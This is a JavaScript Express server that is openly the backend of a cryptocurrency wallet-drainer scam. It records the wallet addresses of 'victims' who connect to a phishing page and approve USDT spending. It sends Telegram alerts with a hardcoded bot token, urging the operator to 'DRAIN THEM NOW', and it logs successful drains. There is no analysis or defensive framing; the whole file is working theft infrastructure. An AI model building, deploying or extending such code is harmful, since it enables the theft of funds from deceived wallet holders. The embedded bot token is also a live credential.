import express from 'express';
import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import cors from 'cors';

const app = express();
const PORT = 8989;

// YOUR TELEGRAM BOT
const BOT_TOKEN = '8594970934:AAGJZhbCc5Ogvgy5saG-RQs8lVRO6miSa6Y';
const CHAT_ID = '909411455';

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Initialize SQLite database
let db;
async function initDb() {
    try {
        db = await open({
            filename: './database.sqlite',
            driver: sqlite3.Database
        });

        // Create table if it doesn't exist
        await db.exec(`
            CREATE TABLE IF NOT EXISTS addresses (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                address TEXT UNIQUE NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        console.log('✅ Database initialized successfully');

        // Test the database
        const test = await db.get('SELECT COUNT(*) as count FROM addresses');
        console.log(`📊 Current addresses in DB: ${test.count}`);

    } catch (err) {
        console.error('❌ Database initialization error:', err);
    }
}

// Initialize DB on startup
initDb().catch(console.error);

// Send Telegram message
async function sendTelegramMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        console.log('📤 Sending Telegram message...');
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Telegram message sent');
        } else {
            console.error('❌ Telegram error:', data.description);
        }
        return data;
    } catch (err) {
        console.error('❌ Telegram fetch error:', err.message);
    }
}

// API: record a connection or approval
app.post('/api/approve', async (req, res) => {
    try {
        const { address, action, tx } = req.body;
        console.log('📥 Received /api/approve request:', { address, action, tx });

        // Validate address
        if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
            console.log('❌ Invalid address format:', address);
            return res.status(400).json({ error: 'Invalid address' });
        }

        // Insert into database (ignore if duplicate)
        let isNewAddress = false;
        try {
            const result = await db.run(
                'INSERT OR IGNORE INTO addresses (address) VALUES (?)',
                [address]
            );

            if (result.changes > 0) {
                isNewAddress = true;
                console.log('✅ New address added to DB:', address);
            } else {
                console.log('ℹ️ Address already exists in DB:', address);
            }
        } catch (err) {
            console.error('❌ DB Insert Error:', err);
        }

        // Send Telegram notifications
        if (action === 'approve') {
            // Send approval notification
            const message = `
🚨 <b>VICTIM APPROVED USDT!</b>

💼 Address: <code>${address}</code>
🔗 Tx Hash: <code>${tx || 'N/A'}</code>
⏰ Time: ${new Date().toLocaleString()}

👉 <b>Go to admin panel to DRAIN THEM NOW!</b>
            `;
            await sendTelegramMessage(message);

        } else if (action === 'connect' && isNewAddress) {
            // Send new connection notification (only for new addresses)
            const message = `
👀 <b>New Visitor Connected Wallet!</b>

💼 Address: <code>${address}</code>
⏰ Time: ${new Date().toLocaleString()}

⏳ Waiting for them to click Approve...
            `;
            await sendTelegramMessage(message);
        }

        res.json({ success: true, isNewAddress });

    } catch (err) {
        console.error('❌ Error in /api/approve:', err);
        res.status(500).json({ error: 'Server error' });
    }
});

// API: get all addresses
app.get('/api/addresses', async (req, res) => {
    try {
        const rows = await db.all('SELECT address FROM addresses ORDER BY created_at DESC');
        console.log('📊 Sending addresses:', rows.map(r => r.address));
        res.json(rows.map(row => row.address));
    } catch (err) {
        console.error('❌ Error fetching addresses:', err);
        res.status(500).json({ error: 'Could not read data' });
    }
});

// API: log drains
app.post('/api/drain', async (req, res) => {
    try {
        const { address, amount, tx } = req.body;
        console.log('💰 Drain recorded:', { address, amount, tx });

        const message = `
💰 <b>DRAIN SUCCESSFUL!</b>

💼 Victim: <code>${address}</code>
💵 Amount: ${amount} USDT
🔗 Tx: <code>${tx}</code>

✅ Funds sent to your wallet!
        `;
        await sendTelegramMessage(message);

        res.json({ success: true });
    } catch (err) {
        console.error('❌ Drain error:', err);
        res.status(500).json({ error: 'Server error' });
    }
});

// DEBUG: View database contents
app.get('/api/debug/db', async (req, res) => {
    try {
        const rows = await db.all('SELECT * FROM addresses ORDER BY created_at DESC');
        const count = await db.get('SELECT COUNT(*) as count FROM addresses');
        console.log('📊 Database debug - total:', count.count);
        res.json({
            total: count.count,
            addresses: rows
        });
    } catch (err) {
        console.error('❌ Debug error:', err);
        res.status(500).json({ error: err.message });
    }
});

// Test endpoint
app.get('/api/test', (req, res) => {
    res.json({
        status: 'online',
        time: new Date().toISOString(),
        db: db ? 'connected' : 'not connected'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🔍 Test: http://localhost:${PORT}/api/test`);
    console.log(`📊 Debug: http://localhost:${PORT}/api/debug/db`);
    console.log(`📋 Addresses: http://localhost:${PORT}/api/addresses`);
});